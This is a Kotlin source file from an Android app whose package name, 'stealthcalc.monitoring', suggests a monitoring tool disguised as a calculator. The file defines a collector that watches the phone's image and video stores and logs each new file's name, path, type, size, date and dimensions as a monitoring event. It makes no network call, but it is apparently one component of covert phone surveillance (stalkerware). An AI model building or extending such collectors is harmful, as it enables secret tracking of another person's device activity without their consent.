package com.stealthcalc.monitoring.collector

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.MediaAddedPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class MediaChangeCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private val scope = CoroutineScope(Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var imageObserver: ContentObserver? = null
    private var videoObserver: ContentObserver? = null
    private var lastImageId: Long = getMaxId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
    private var lastVideoId: Long = getMaxId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI)

    fun start() {
        if (!repository.isMetricEnabled("media_changes")) return
        if (imageObserver != null) return

        imageObserver = createObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "IMAGE")
        videoObserver = createObserver(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "VIDEO")

        context.contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, imageObserver!!
        )
        context.contentResolver.registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, videoObserver!!
        )
    }

    fun stop() {
        imageObserver?.let { context.contentResolver.unregisterContentObserver(it) }
        videoObserver?.let { context.contentResolver.unregisterContentObserver(it) }
        imageObserver = null
        videoObserver = null
    }

    private fun createObserver(contentUri: Uri, mediaType: String): ContentObserver {
        return object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                scope.launch { scanNew(contentUri, mediaType) }
            }
        }
    }

    private suspend fun scanNew(contentUri: Uri, mediaType: String) {
        val lastId = if (mediaType == "IMAGE") lastImageId else lastVideoId

        val cursor = context.contentResolver.query(
            contentUri,
            arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.RELATIVE_PATH,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.WIDTH,
                MediaStore.MediaColumns.HEIGHT,
            ),
            "${MediaStore.MediaColumns._ID} > ?",
            arrayOf(lastId.toString()),
            "${MediaStore.MediaColumns._ID} ASC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(0)
                val displayName = it.getString(1) ?: ""
                val relativePath = it.getString(2)
                val mimeType = it.getString(3)
                val size = it.getLong(4)
                val dateAdded = it.getLong(5)
                val width = it.getInt(6)
                val height = it.getInt(7)

                val payload = Json.encodeToString(
                    MediaAddedPayload(
                        displayName = displayName,
                        relativePath = relativePath,
                        mimeType = mimeType,
                        sizeBytes = size,
                        dateAdded = dateAdded,
                        width = if (width > 0) width else null,
                        height = if (height > 0) height else null,
                        mediaType = mediaType,
                    )
                )
                repository.recordEvent(MonitoringEventKind.MEDIA_ADDED, payload)

                if (mediaType == "IMAGE" && id > lastImageId) lastImageId = id
                if (mediaType == "VIDEO" && id > lastVideoId) lastVideoId = id
            }
        }
    }

    private fun getMaxId(uri: Uri): Long {
        return runCatching {
            context.contentResolver.query(
                uri,
                arrayOf("MAX(${MediaStore.MediaColumns._ID})"),
                null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) cursor.getLong(0) else 0L
            } ?: 0L
        }.getOrDefault(0L)
    }
}
